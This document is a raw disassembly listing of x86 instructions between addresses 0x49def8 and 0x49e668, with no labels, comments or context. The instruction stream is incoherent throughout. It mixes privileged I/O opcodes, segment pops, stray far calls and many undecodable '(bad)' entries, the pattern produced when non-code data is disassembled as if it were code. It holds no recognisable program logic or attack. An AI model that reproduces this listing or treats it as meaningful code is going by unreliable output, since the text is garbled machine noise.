  49def8:	sbb    DWORD PTR [eax],ecx
  49defa:	sbb    ebx,DWORD PTR [ebx]
  49defc:	mov    ebx,0x41d7ff18
  49df01:	adc    eax,0x38111016
  49df06:	adc    BYTE PTR [ebx],dl
  49df08:	pop    ss
  49df09:	sbb    dl,BYTE PTR [ebx+edx*1+0x12]
  49df0d:	sbb    bh,BYTE PTR [eax+0x7e]
  49df10:	jnp    0x49df73
  49df12:	ja     0x49df1b
  49df14:	sbb    DWORD PTR [esi],edx
  49df16:	push   es
  49df17:	inc    ebx
  49df18:	ficom  DWORD PTR [esi+ebx*1]
  49df1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49df1c:	push   ds
  49df1d:	sbb    DWORD PTR ds:0x81211214,edx
  49df23:	pop    edx
  49df24:	jnp    0x49df37
  49df26:	xor    al,0x1d
  49df28:	dec    esi
  49df29:	push   ss
  49df2a:	js     0x49df00
  49df2c:	mov    ah,BYTE PTR [edi+ecx*2-0x4d]
  49df30:	nop    DWORD PTR [ebx]
  49df33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49df34:	rcl    BYTE PTR [edx],1
  49df36:	add    dl,BYTE PTR [edx]
  49df38:	xor    ecx,eax
  49df3a:	int3   
  49df3b:	sub    al,0x9b
  49df3d:	cld    
  49df3e:	nop
  49df3f:	and    BYTE PTR [esi],bl
  49df41:	jg     0x49df9f
  49df43:	mov    eax,ds:0x30d46813
  49df48:	push   ds
  49df49:	push   ss
  49df4a:	adc    eax,0xdd419b16
  49df4f:	test   al,0x17
  49df51:	rcr    BYTE PTR [edx],cl
  49df53:	pusha  
  49df54:	shr    edi,0x9d
  49df57:	inc    ecx
  49df58:	addr16 xchg edx,eax
  49df5a:	fdivr  st,st(6)
  49df5c:	add    BYTE PTR ds:0x8cc81a4c,cl
  49df62:	or     eax,0x911cdc6a
  49df67:	sbb    al,0x83
  49df69:	enter  0x7a0d,0x5c
  49df6d:	je     0x49df88
  49df6f:	sbb    BYTE PTR [ecx],bl
  49df71:	mov    al,ds:0x1eb09ecb
  49df77:	test   BYTE PTR [edi-0x20e3e9c9],bl
  49df7d:	(bad)  
  49df7e:	sub    eax,0x49feff64
  49df83:	or     BYTE PTR [esi],cl
  49df85:	sbb    ebx,DWORD PTR [edi]
  49df87:	cmp    eax,0x7ba04c46
  49df8c:	mov    BYTE PTR [edi],dl
  49df8e:	mov    esp,0xde86071a
  49df93:	dec    eax
  49df94:	mov    WORD PTR [edi],es
  49df96:	xor    eax,0x441404ce
  49df9b:	add    edi,DWORD PTR [ebp+0x63]
  49df9e:	idiv   edi
  49dfa0:	jo     0x49dfa5
  49dfa2:	push   ss
  49dfa3:	inc    edx
  49dfa4:	das    
  49dfa5:	ss cmp eax,0x891b363e
  49dfab:	sbb    eax,0xe3179907
  49dfb0:	pop    ds
  49dfb1:	mov    ah,0x0
  49dfb3:	push   ds
  49dfb4:	adc    eax,0x41173ec9
  49dfb9:	sbb    BYTE PTR [ecx+ebx*1-0x2111c1bb],bl
  49dfc0:	jnp    0x49df46
  49dfc2:	push   edi
  49dfc3:	jo     0x49dfe0
  49dfc5:	push   ds
  49dfc6:	cmp    ecx,DWORD PTR [eax+0x19]
  49dfc9:	aas    
  49dfca:	sbb    al,BYTE PTR ss:[ebp+0x33]
  49dfce:	call   0x787f4b19
  49dfd3:	push   ebp
  49dfd4:	enter  0xe137,0xd0
  49dfd8:	hlt    
  49dfd9:	pop    ebx
  49dfda:	jecxz  0x49e00e
  49dfdc:	aas    
  49dfdd:	inc    eax
  49dfde:	out    dx,al
  49dfdf:	add    BYTE PTR [edx+0x16],al
  49dfe2:	or     BYTE PTR [esi+0x36],bl
  49dfe5:	mov    eax,0x3635660f
  49dfea:	push   ds
  49dfeb:	jle    0x49e041
  49dfed:	cmp    eax,0x6f0f1ccc
  49dff2:	mov    edi,gs
  49dff4:	ds mov esi,0xd2e44108
  49dffa:	push   edi
  49dffb:	popa   
  49dffc:	(bad)  
  49dffd:	xlat   BYTE PTR ds:[ebx]
  49dffe:	lea    esi,[edi+0x72]
  49e001:	cmp    eax,0x56be19e8
  49e006:	ja     0x49df8f
  49e008:	mov    al,0xdb
  49e00a:	push   0x3
  49e00c:	xor    eax,0x2e41024c
  49e011:	cmp    eax,0xb8d77119
  49e016:	sub    bh,0x80
  49e019:	stos   BYTE PTR es:[edi],al
  49e01a:	shl    BYTE PTR [ebp+0x3b04031b],0x1
  49e021:	or     eax,0x84a21e81
  49e026:	sbb    DWORD PTR [eax+0x58a81846],esi
  49e02c:	jecxz  0x49e06e
  49e02e:	out    dx,eax
  49e02f:	ds std 
  49e031:	cmp    eax,0x67771bad
  49e036:	adc    al,0xd6
  49e038:	sbb    ch,cl
  49e03a:	or     BYTE PTR [edx],bh
  49e03c:	xor    eax,0xa844b64c
  49e041:	(bad)  
  49e042:	mov    edx,0x583e5839
  49e047:	popf   
  49e048:	cmp    dh,al
  49e04a:	add    ebx,DWORD PTR [eax]
  49e04c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e04d:	cmovo  ecx,DWORD PTR [esi+ebp*8+0x1635c285]
  49e055:	xor    eax,0x6f07d146
  49e05a:	pusha  
  49e05b:	test   BYTE PTR [ecx],bl
  49e05d:	jbe    0x49e0b5
  49e05f:	jle    0x49dfe5
  49e061:	popa   
  49e062:	daa    
  49e063:	fidivr DWORD PTR [ebx+0x36]
  49e066:	cmp    al,al
  49e068:	sbb    edi,edi
  49e06a:	inc    esp
  49e06b:	sbb    al,0x6f
  49e06d:	and    eax,0x7e04b5da
  49e072:	sbb    cl,BYTE PTR [esi+0x13ef5780]
  49e078:	push   es
  49e079:	xor    DWORD PTR [esi+0x6e],edx
  49e07c:	mov    dl,0x1a
  49e07e:	ins    DWORD PTR es:[edi],dx
  49e07f:	sbb    ch,0x3c
  49e082:	les    edi,FWORD PTR [edi]
  49e084:	dec    esi
  49e085:	xor    BYTE PTR [edi],al
  49e087:	xchg   ecx,eax
  49e088:	sub    dh,BYTE PTR [ecx+0x4f1c94c4]
  49e08e:	outs   dx,DWORD PTR ds:[esi]
  49e08f:	xor    eax,0x396639f7
  49e094:	aas    
  49e095:	add    edi,DWORD PTR [edi]
  49e097:	jno    0x49e111
  49e099:	sub    ebx,DWORD PTR [ecx-0x77]
  49e09c:	inc    esi
  49e09d:	xor    al,0x47
  49e09f:	add    BYTE PTR [eax-0x3fa3ecc1],ch
  49e0a5:	sub    ch,BYTE PTR ds:0x454880ef
  49e0ab:	repnz in eax,0x3f
  49e0ae:	clc    
  49e0af:	adc    dl,dh
  49e0b1:	add    al,ah
  49e0b3:	add    al,0x1
  49e0b5:	enter  0x4f84,0x1
  49e0b9:	mov    edi,0x6421542e
  49e0be:	push   ss
  49e0bf:	xchg   ebx,eax
  49e0c0:	sbb    DWORD PTR [edi],edx
  49e0c2:	sbb    BYTE PTR [esi],dl
  49e0c4:	and    esp,ecx
  49e0c6:	push   DWORD PTR [eax+0x171549ad]
  49e0cc:	adc    dl,BYTE PTR [esi]
  49e0ce:	inc    ecx
  49e0cf:	cmp    bh,BYTE PTR [edx]
  49e0d1:	push   ss
  49e0d2:	adc    DWORD PTR ds:0xf0afdfc0,ecx
  49e0d8:	push   ds
  49e0d9:	adc    edi,esi
  49e0db:	adc    dl,BYTE PTR [ecx]
  49e0dd:	pop    es
  49e0de:	or     BYTE PTR [eax+0x42],dl
  49e0e1:	or     BYTE PTR [esi],dl
  49e0e3:	adc    eax,0xc00737f
  49e0e8:	loop   0x49e0d5
  49e0ea:	push   ds
  49e0eb:	sbb    BYTE PTR [ebp+0x36],al
  49e0ee:	ss pop ss
  49e0f0:	pop    es
  49e0f1:	adc    ah,al
  49e0f3:	add    esp,edi
  49e0f5:	mov    esi,0x1e1b0110
  49e0fa:	ds sbb DWORD PTR ss:[ebx+eiz*1],edi
  49e0ff:	cld    
  49e100:	jbe    0x49e105
  49e102:	dec    esp
  49e103:	push   cs
  49e104:	push   ds
  49e105:	inc    esi
  49e106:	cmp    eax,0x1b173d56
  49e10b:	jno    0x49e0cc
  49e10d:	cmc    
  49e10e:	in     al,dx
  49e10f:	add    al,0xae
  49e111:	push   ds
  49e112:	inc    eax
  49e113:	inc    edx
  49e114:	jb     0x49e134
  49e116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e117:	in     al,dx
  49e118:	ins    DWORD PTR es:[edi],dx
  49e119:	(bad)  
  49e11b:	sbb    dh,cl
  49e11d:	ror    BYTE PTR [esi+0x1f],0x9f
  49e121:	add    bl,BYTE PTR [eax]
  49e123:	pop    ds
  49e124:	das    
  49e125:	mov    ebp,0x1800bc2f
  49e12a:	daa    
  49e12b:	pop    ds
  49e12c:	add    bh,BYTE PTR [esi]
  49e12e:	push   0xffffffb8
  49e130:	pusha  
  49e131:	push   0xffffffa5
  49e133:	inc    esi
  49e134:	mov    edx,0x80983f42
  49e139:	in     eax,dx
  49e13a:	(bad)  
  49e13b:	pop    ds
  49e13c:	dec    esi
  49e13d:	inc    edi
  49e13e:	inc    esi
  49e13f:	push   edi
  49e140:	sbb    al,BYTE PTR [esi+0x35]
  49e143:	pop    DWORD PTR [edx]
  49e145:	loope  0x49e152
  49e147:	ja     0x49e163
  49e149:	add    al,BYTE PTR ss:[ebx+0x101df66f]
  49e150:	or     bl,dl
  49e152:	cs and eax,0xcf3c0100
  49e158:	sbb    eax,DWORD PTR [edx+0x1019460e]
  49e15e:	add    esi,edx
  49e160:	mov    esp,0x122f816e
  49e165:	push   ss
  49e166:	and    DWORD PTR [edx],esp
  49e168:	jns    0x49e1b1
  49e16a:	aam    0x6e
  49e16c:	push   esi
  49e16d:	add    DWORD PTR [ecx],eax
  49e16f:	dec    esi
  49e170:	or     al,0xe4
  49e172:	jns    0x49e112
  49e174:	out    0x2f,eax
  49e176:	popa   
  49e177:	gs sub eax,0x134f6c0d
  49e17d:	cs add al,0xd4
  49e180:	push   ss
  49e181:	adc    al,BYTE PTR [eax]
  49e183:	jo     0x49e1a2
  49e185:	and    al,0xe5
  49e187:	test   al,0xd9
  49e189:	pop    DWORD PTR [edx]
  49e18b:	jb     0x49e191
  49e18d:	cmp    cl,ch
  49e18f:	aas    
  49e190:	xor    dh,0xeb
  49e193:	add    DWORD PTR [ebx+eax*1],ecx
  49e196:	add    al,0x4
  49e198:	and    BYTE PTR ds:0xfff4f347,cl
  49e19e:	call   DWORD PTR [ebx]
  49e1a0:	adc    BYTE PTR [edi],cl
  49e1a2:	je     0x49e1e8
  49e1a4:	ds cmp al,0xa8
  49e1a7:	mov    dl,0xa9
  49e1a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e1aa:	loop   0x49e170
  49e1ac:	mov    ebx,0x3034f6b6
  49e1b1:	sub    eax,0xdb8a80cf
  49e1b6:	out    0x9b,eax
  49e1b8:	iret   
  49e1b9:	aaa    
  49e1ba:	sbb    al,BYTE PTR [ecx]
  49e1bc:	sub    BYTE PTR [esi],al
  49e1be:	add    eax,0x56885605
  49e1c3:	add    al,al
  49e1c5:	scas   al,BYTE PTR es:[edi]
  49e1c6:	int    0xff
  49e1c8:	outs   dx,DWORD PTR ds:[esi]
  49e1c9:	ss out dx,al
  49e1cb:	(bad)  
  49e1cc:	cli    
  49e1cd:	mov    dh,0xb7
  49e1cf:	mov    bh,0xff
  49e1d1:	(bad)  
  49e1d2:	nop
  49e1d3:	xchg   ecx,eax
  49e1d4:	clc    
  49e1d5:	sub    ebp,DWORD PTR [ebx]
  49e1d7:	sub    al,0xbb
  49e1d9:	add    esp,DWORD PTR [eax-0x59]
  49e1dc:	mov    BYTE PTR ds:0x126e607,ch
  49e1e2:	pop    ss
  49e1e3:	or     ch,BYTE PTR [edi]
  49e1e5:	clc    
  49e1e6:	fcomip st,st(0)
  49e1e8:	or     BYTE PTR [eax],cl
  49e1ea:	xor    DWORD PTR [edi],ebx
  49e1ec:	outs   dx,BYTE PTR ds:[esi]
  49e1ed:	bound  eax,QWORD PTR [ecx+0x3b]
  49e1f0:	cmp    bl,BYTE PTR [ebp-0x2d79746a]
  49e1f6:	shl    DWORD PTR [eax-0xc],cl
  49e1f9:	(bad)  
  49e1fa:	mov    esi,0xffffffae
  49e1ff:	(bad)  
  49e200:	inc    ebp
  49e202:	test   al,0x8c
  49e204:	push   DWORD PTR [edx-0x48007c5e]
  49e20a:	into   
  49e20b:	ret    
  49e20c:	(bad)  
  49e20d:	fucomp st(2)
  49e20f:	call   0x74c46513
  49e214:	frstor [eax]
  49e216:	sbb    al,0x1b
  49e218:	mov    cl,0x19
  49e21a:	push   cs
  49e21b:	push   cs
  49e21c:	mov    bl,0x1a
  49e21e:	push   es
  49e21f:	push   es
  49e220:	(bad)  
  49e221:	(bad)  
  49e222:	(bad)  
  49e223:	(bad)  
  49e224:	fisubr DWORD PTR [eax+0x5e]
  49e227:	pop    esi
  49e228:	cld    
  49e229:	int    0xcf
  49e22b:	iret   
  49e22c:	jmp    eax
  49e22e:	loope  0x49e210
  49e230:	(bad)  
  49e231:	fcmovnu st,st(2)
  49e233:	fcos   
  49e235:	ret    0xc1c2
  49e238:	call   FWORD PTR [edx-0x51006466]
  49e23e:	scas   eax,DWORD PTR es:[edi]
  49e23f:	mov    al,0xff
  49e241:	mov    ah,0xb7
  49e243:	mov    eax,0xf811a3e7
  49e248:	push   DWORD PTR [ebp+0x77]
  49e24b:	jns    0x49e238
  49e24d:	mov    ah,0x96
  49e24f:	sahf   
  49e250:	inc    ecx
  49e251:	fwait
  49e252:	ins    DWORD PTR es:[edi],dx
  49e253:	and    BYTE PTR [eax+0x37000e14],dl
  49e259:	inc    esi
  49e25a:	xor    BYTE PTR [ecx-0x1],0xff
  49e25e:	(bad)  
  49e25f:	push   DWORD PTR [eax+0x70]
  49e262:	mov    al,0x8a
  49e264:	lea    ecx,[ebp-0x6863612c]
  49e26a:	clc    
  49e26b:	int3   
  49e26c:	mov    edi,0xdbe7ffb6
  49e271:	int    0xff
  49e273:	mov    ebp,0x7cffd2d1
  49e278:	mov    bl,0xbe
  49e27a:	call   FWORD PTR [edx-0x51]
  49e27d:	(bad)  
  49e27e:	inc    DWORD PTR [eax-0x1]
  49e281:	(bad)  
  49e283:	mov    bh,0xab
  49e285:	push   ds
  49e286:	sbb    ah,BYTE PTR [ebp-0x459d0036]
  49e28c:	(bad)  
  49e28e:	mov    ebx,0x818c0ec4
  49e293:	jp     0x49e294
  49e295:	dec    ebp
  49e296:	inc    ecx
  49e297:	call   FWORD PTR ds:[eax]
  49e29a:	(bad)  
  49e29b:	ud0    ebp,DWORD PTR [ebx+0xa]
  49e29f:	call   0xdeff:0x6868f6fd
  49e2a6:	add    bh,bh
  49e2a8:	xlat   BYTE PTR ds:[ebx]
  49e2a9:	fcom   st(7)
  49e2ab:	(bad)  
  49e2ac:	fimul  DWORD PTR [eax]
  49e2ae:	push   es
  49e2af:	fadd   DWORD PTR [esi-0x4c9f0056]
  49e2b5:	fld    DWORD PTR [eax]
  49e2b7:	inc    DWORD PTR [edi-0x4a006601]
  49e2bd:	xchg   BYTE PTR [esi+0x43ff9898],dl
  49e2c3:	inc    esp
  49e2c4:	push   ds
  49e2c5:	jno    0x49e29a
  49e2c7:	mov    DWORD PTR [ecx+eax*8-0x5a],0x43092f68
  49e2cf:	(bad)  
  49e2d0:	fisttp WORD PTR [eax+edx*8+0x1]
  49e2d4:	call   0x88d36c1a
  49e2d9:	stos   BYTE PTR es:[edi],al
  49e2da:	jle    0x49e25c
  49e2dc:	jg     0x49e2c0
  49e2de:	mov    dh,0xc0
  49e2e0:	mov    ebp,0xdf05ffff
  49e2e5:	out    0xe7,al
  49e2e7:	in     eax,0xff
  49e2e9:	lods   eax,DWORD PTR ds:[esi]
  49e2ea:	lds    ebp,FWORD PTR [esi]
  49e2ec:	jbe    0x49e286
  49e2ee:	lods   eax,DWORD PTR ds:[esi]
  49e2ef:	jmp    FWORD PTR [ebx+esi*4-0x3b]
  49e2f3:	call   FWORD PTR [esi-0x3d]
  49e2f6:	jmp    0x19ff:0xc48c30ff
  49e2fd:	fdivr  DWORD PTR [esi-0x17d7920]
  49e303:	adc    al,0x7d
  49e305:	lods   al,BYTE PTR ds:[esi]
  49e306:	dec    esi
  49e307:	jl     0x49e2be
  49e309:	jmp    DWORD PTR [edi]
  49e30b:	lea    ebp,[esi]
  49e30d:	sbb    DWORD PTR [ebp+0x4f],ebx
  49e310:	mov    ebp,0xe16af41
  49e315:	and    eax,0xfff8ff35
  49e31a:	add    eax,DWORD PTR [esi]
  49e31c:	add    edx,ebx
  49e31e:	(bad)  [eax+0x36]
  49e321:	pop    ebx
  49e322:	popa   
  49e323:	add    bh,bh
  49e325:	bnd jmp esp
  49e328:	out    0xb2,al
  49e32a:	mov    al,0x8e
  49e32c:	pop    es
  49e32d:	lods   eax,DWORD PTR ds:[esi]
  49e32e:	fstp   DWORD PTR [edx-0x52]
  49e331:	xchg   ch,al
  49e333:	add    bh,bh
  49e335:	popf   
  49e336:	(bad)  
  49e337:	mov    esp,0xd868e7f
  49e33c:	add    eax,0xa9ffc182
  49e341:	sahf   
  49e342:	mov    WORD PTR [esi+0x60ec4e6f],cs
  49e348:	and    eax,0x97e240a0
  49e34d:	repz sub dh,BYTE PTR [esi+0x1a38209]
  49e354:	mov    edi,0xfde6ffe1
  49e359:	xor    ecx,eax
  49e35b:	leave  
  49e35c:	retf   0xadc3
  49e35f:	scas   eax,DWORD PTR es:[edi]
  49e360:	stos   DWORD PTR es:[edi],eax
  49e361:	call   DWORD PTR [ebx+0x725f46a1]
  49e367:	outs   dx,DWORD PTR ds:[esi]
  49e368:	push   DWORD PTR [ebx]
  49e36a:	cmp    eax,0xfede0be0
  49e36f:	cmp    eax,0xa3711dff
  49e374:	jmp    FWORD PTR [esp+esi*8]
  49e377:	call   DWORD PTR [ebx]
  49e379:	imul   ebx,DWORD PTR [esi+esi*1+0x5ff210b],0x7ffff002
  49e384:	mov    bl,0x46
  49e386:	or     eax,0xa0e1602
  49e38b:	call   FWORD PTR [edi]
  49e38d:	sbb    bl,BYTE PTR ds:0x1c1d24ff
  49e393:	jmp    FWORD PTR [eax]
  49e395:	and    esp,DWORD PTR [eax]
  49e397:	(bad)  
  49e398:	cmp    bh,BYTE PTR [ecx]
  49e39a:	cmp    edi,edi
  49e39c:	inc    edi
  49e39d:	sbb    bh,0xee
  49e3a0:	push   0x6b
  49e3a2:	jmp    DWORD PTR [eax-0x29d16162]
  49e3a8:	retf   0xc9c9
  49e3ab:	(bad)  
  49e3ac:	mov    esi,0x83ffbbb9
  49e3b1:	pop    ebx
  49e3b2:	(bad)  
  49e3b3:	jg     0x49e37c
  49e3b5:	stos   BYTE PTR es:[edi],al
  49e3b6:	nop
  49e3b7:	mov    esi,0xbcff8ea7
  49e3bc:	mov    edx,0xc3c7ffb9
  49e3c1:	ficom  WORD PTR [ebp-0x810100]
  49e3c7:	int3   
  49e3c8:	div    BYTE PTR [ebx]
  49e3ca:	push   es
  49e3cb:	jge    0x49e3cc
  49e3cd:	mov    es,WORD PTR [eax]
  49e3cf:	jmp    FWORD PTR [edi+0x42fe9626]
  49e3d5:	inc    edx
  49e3d6:	inc    ebx
  49e3d7:	and    edi,ecx
  49e3d9:	lds    esp,FWORD PTR [esi+0x7605c4cf]
  49e3df:	push   ss
  49e3e0:	xor    DWORD PTR [eax],edx
  49e3e2:	(bad)  
  49e3e3:	jg     0x49e3ec
  49e3e5:	inc    edx
  49e3e6:	sub    BYTE PTR [ecx],dl
  49e3e8:	and    DWORD PTR [ecx],esp
  49e3ea:	and    ah,BYTE PTR [edx+0x5d]
  49e3ed:	push   ebp
  49e3ee:	push   ebx
  49e3ef:	retf   0xacb0
  49e3f2:	test   eax,0xcd605afd
  49e3f7:	outs   dx,DWORD PTR ds:[esi]
  49e3f8:	clc    
  49e3f9:	call   DWORD PTR [edx-0x1]
  49e3fc:	push   ds
  49e3fd:	adc    al,BYTE PTR [edx]
  49e3ff:	call   DWORD PTR ds:0x22ff694b
  49e405:	outs   dx,BYTE PTR ds:[esi]
  49e406:	cdq    
  49e407:	out    dx,al
  49e408:	and    ebp,DWORD PTR [edi+edi*8]
  49e40b:	adc    eax,DWORD PTR [esi]
  49e40d:	add    BYTE PTR [edx],dl
  49e40f:	ja     0x49e3fd
  49e411:	pop    eax
  49e412:	lock or eax,0x5e252aff
  49e418:	dec    ecx
  49e419:	inc    ebx
  49e41a:	push   esi
  49e41b:	jae    0x49e48a
  49e41d:	dec    esi
  49e41e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e41f:	mov    ds:0x2a3feda0,eax
  49e424:	(bad)  
  49e425:	(bad)  
  49e426:	fcom   st(6)
  49e428:	aad    0xff
  49e42a:	jmp    0x49e416
  49e42c:	sar    BYTE PTR ds:[esi-0x757575],cl
  49e433:	aaa    
  49e434:	add    bh,bh
  49e436:	jg     0x49e3b9
  49e438:	jecxz  0x49e3d3
  49e43a:	sbb    eax,0xb2f8b417
  49e43f:	mov    edx,0x9698ffb3
  49e444:	xchg   esp,eax
  49e445:	pop    esi
  49e446:	and    eax,0xabfff058
  49e44b:	test   eax,0xbabb8ea7
  49e450:	outs   dx,BYTE PTR ds:[esi]
  49e451:	nop
  49e452:	(bad)  
  49e453:	jnp    0x49e4d0
  49e455:	jl     0x49e46c
  49e457:	pop    edi
  49e458:	fmul   DWORD PTR [ebx-0x8483ea]
  49e45e:	jg     0x49e460
  49e460:	das    
  49e461:	lods   al,BYTE PTR ds:[esi]
  49e462:	lods   al,BYTE PTR ds:[esi]
  49e463:	inc    esi
  49e464:	js     0x49e402
  49e466:	cmp    al,0x15
  49e468:	jmp    0x933b5de5
  49e46d:	mov    ds:0xf006432e,eax
  49e472:	pop    ss
  49e473:	cmp    al,0x94
  49e475:	jne    0x49e4ed
  49e477:	jne    0x49e4b5
  49e479:	outs   dx,DWORD PTR ds:[esi]
  49e47a:	outs   dx,BYTE PTR ds:[esi]
  49e47b:	mov    ds:0xd75a5b5a,eax
  49e480:	inc    ebp
  49e481:	sar    edi,0xff
  49e484:	push   ds
  49e485:	cmc    
  49e486:	jns    0x49e4fa
  49e488:	jb     0x49e483
  49e48a:	xor    bl,BYTE PTR [esi]
  49e48c:	pop    ds
  49e48d:	call   DWORD PTR [ebp+0x4d]
  49e490:	dec    eax
  49e491:	push   DWORD PTR [edx+esi*1]
  49e494:	data16 sbb al,0xb8
  49e497:	pop    es
  49e498:	mov    edi,0x2f0e37e9
  49e49d:	das    
  49e49e:	call   DWORD PTR [ebx+0x50]
  49e4a1:	dec    esp
  49e4a2:	out    dx,al
  49e4a3:	je     0x49e516
  49e4a5:	call   FWORD PTR [edx+ebx*4-0x1d52f867]
  49e4ac:	lds    edx,FWORD PTR [ebp+0x24]
  49e4af:	sar    bh,0xba
  49e4b2:	(bad)  
  49e4b3:	lods   al,BYTE PTR ds:[esi]
  49e4b4:	stos   DWORD PTR es:[edi],eax
  49e4b5:	pop    esi
  49e4b6:	mov    DWORD PTR [eax],eax
  49e4b8:	call   FWORD PTR [eax+0x4ce0f6cd]
  49e4be:	dec    ebp
  49e4bf:	dec    ebp
  49e4c0:	or     al,BYTE PTR [bx+si]
  49e4c3:	dec    DWORD PTR [edi]
  49e4c5:	inc    DWORD PTR [edi]
  49e4c7:	sar    DWORD PTR [edi-0x3f],1
  49e4ca:	push   edi
  49e4cb:	cs daa 
  49e4cd:	sub    bh,bh
  49e4cf:	xchg   esp,eax
  49e4d0:	nop
  49e4d1:	push   esi
  49e4d2:	mov    ch,0xb1
  49e4d4:	mov    cl,0xff
  49e4d6:	lea    ecx,[ebp+ecx*4-0x5e017701]
  49e4dd:	rol    ebx,0xed
  49e4e0:	mov    ebp,0xc0c066bb
  49e4e5:	mov    esp,0xff5f8ff6
  49e4ea:	add    eax,0xb86a069b
  49e4ef:	xchg   esi,eax
  49e4f0:	jbe    0x49e47e
  49e4f2:	mov    esi,ss
  49e4f4:	test   al,0xe
  49e4f6:	call   0x9090:0xff006fcd
  49e4fd:	xchg   ecx,eax
  49e4fe:	(bad)  
  49e4ff:	les    eax,FWORD PTR ss:[edx]
  49e502:	push   0x76
  49e504:	sub    eax,0x790affd7
  49e509:	or     eax,DWORD PTR [ebx]
  49e50b:	add    BYTE PTR [ebx-0x5d5eb07e],0xa1
  49e512:	cs sbb esi,edi
  49e515:	jg     0x49e568
  49e517:	mov    ch,0x9e
  49e519:	into   
  49e51a:	iret   
  49e51b:	into   
  49e51c:	dec    DWORD PTR [edx+0x21ff8b8b]
  49e522:	and    esp,DWORD PTR [ebx]
  49e524:	(bad)  
  49e525:	cmp    eax,0x191fbe3c
  49e52a:	pop    esi
  49e52b:	sub    dh,dl
  49e52d:	call   DWORD PTR [edi+0x7e7e9395]
  49e533:	(bad)
  49e537:	out    dx,eax
  49e538:	js     0x49e4fd
  49e53a:	call   ebx
  49e53c:	sar    bh,0xc9
  49e53f:	mov    edi,0xff9292be
  49e545:	dec    edi
  49e546:	dec    esi
  49e547:	pop    esi
  49e548:	fild   QWORD PTR [ebp+eax*1-0x13]
  49e54c:	sub    ch,BYTE PTR [ecx]
  49e54e:	sub    DWORD PTR [esi+0x1f],edx
  49e551:	(bad)  
  49e552:	push   ds
  49e553:	add    bh,bh
  49e555:	push   DWORD PTR es:[edx]
  49e558:	xor    DWORD PTR [ecx],esi
  49e55a:	jmp    FWORD PTR [ebp+ecx*2+0x33]
  49e55e:	fwait
  49e55f:	xor    edi,edi
  49e561:	das    
  49e562:	push   es
  49e563:	sbb    al,BYTE PTR cs:[eax]
  49e566:	jmp    DWORD PTR [ebp*2+0x57c3e995]
  49e56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e56e:	out    dx,al
  49e56f:	int3   
  49e570:	enter  0xc276,0xb8
  49e574:	das    
  49e575:	ror    BYTE PTR [esi-0x38355942],0x1e
  49e57c:	ret    
  49e57d:	sar    DWORD PTR [edi+0x788e92ff],0x2
  49e584:	add    DWORD PTR [eax+0x6102e7a],0x75
  49e58b:	or     eax,0x9e2d95a6
  49e590:	jp     0x49e60c
  49e592:	fisubr WORD PTR [esi+0x15652636]
  49e598:	jb     0x49e56a
  49e59a:	ins    BYTE PTR es:[edi],dx
  49e59b:	add    bl,ch
  49e59d:	or     dh,BYTE PTR [esi+edi*2+0xe]
  49e5a1:	data16 mov bl,0xd9
  49e5a4:	inc    BYTE PTR [esp+edi*2]
  49e5a7:	jge    0x49e625
  49e5a9:	xor    edi,DWORD PTR [eax+eax*1-0x2d005d08]
  49e5b0:	dec    esp
  49e5b2:	inc    ebx
  49e5b3:	push   edi
  49e5b4:	xlat   BYTE PTR ds:[ebx]
  49e5b5:	std    
  49e5b6:	push   DWORD PTR [esi-0x32004b4c]
  49e5bc:	push   cs
  49e5bd:	jl     0x49e595
  49e5bf:	mov    dh,0xba
  49e5c1:	(bad)  
  49e5c2:	mov    al,BYTE PTR [edx]
  49e5c4:	fdiv   QWORD PTR [ebp-0x7e]
  49e5c7:	add    DWORD PTR [ecx-0xa7a61a],0xd816452c
  49e5d1:	mov    ah,0xb7
  49e5d3:	xor    BYTE PTR [esi+edi*1],0x2c
  49e5d7:	add    bh,bh
  49e5d9:	cmp    BYTE PTR [ecx],bh
  49e5db:	cmp    BYTE PTR [esi],bl
  49e5dd:	inc    ebp
  49e5de:	dec    ecx
  49e5df:	dec    ecx
  49e5e0:	ss fwait
  49e5e2:	ins    DWORD PTR es:[edi],dx
  49e5e3:	stos   DWORD PTR es:[edi],eax
  49e5e4:	dec    esi
  49e5e5:	dec    edx
  49e5e6:	or     bh,bh
  49e5e8:	dec    eax
  49e5e9:	add    bh,bh
  49e5eb:	inc    esi
  49e5ec:	inc    DWORD PTR [edi+edi*8+0x41]
  49e5f0:	and    BYTE PTR [eax+0x3eff6ccf],dh
  49e5f6:	pop    es
  49e5f7:	xor    BYTE PTR [eax],al
  49e5f9:	scas   al,BYTE PTR es:[edi]
  49e5fa:	shr    BYTE PTR [esp+esi*1],1
  49e5fd:	jge    0x49e5a5
  49e5ff:	jbe    0x49e675
  49e601:	jae    0x49e631
  49e603:	mov    ah,0x42
  49e605:	(bad)  
  49e606:	call   0x769601c3
  49e60b:	add    al,0xfe
  49e60d:	retf   
  49e60e:	mov    edx,0x5399b606
  49e614:	cld    
  49e615:	imul   esi,DWORD PTR [eax],0x76747f5e
  49e61b:	jbe    0x49e694
  49e61d:	(bad)  
  49e61e:	cld    
  49e61f:	dec    esi
  49e620:	pop    ss
  49e621:	sbb    BYTE PTR [ebx],0xc
  49e624:	xchg   edx,eax
  49e625:	push   DWORD PTR [ebx+0x7e0e06b3]
  49e62b:	rcr    DWORD PTR [esi],1
  49e62d:	or     BYTE PTR [eax],cl
  49e62f:	fild   DWORD PTR [ecx]
  49e631:	add    bl,BYTE PTR [eax]
  49e633:	jle    0x49e668
  49e635:	(bad)  
  49e636:	jns    0x49e5ea
  49e638:	mov    cl,0xb2
  49e63a:	(bad)  
  49e63b:	xchg   edx,eax
  49e63c:	mov    al,0xce
  49e63e:	add    ah,dl
  49e640:	loope  0x49e5c4
  49e642:	scas   al,BYTE PTR es:[edi]
  49e643:	mul    BYTE PTR [ebp-0x51385b5d]
  49e649:	arpl   WORD PTR [edi+0x72f5775],ax
  49e64f:	inc    ebx
  49e650:	add    BYTE PTR [esi+0x4c],al
  49e653:	dec    ebx
  49e654:	daa    
  49e655:	xor    bl,ch
  49e657:	mov    eax,0xff5455ae
  49e65c:	aam    0x5a
  49e65e:	push   es
  49e65f:	add    BYTE PTR [esi-0x1308a4f2],ah
  49e665:	jne    0x49e66e
  49e667:	pop    eax
  49e668:	dec    esi
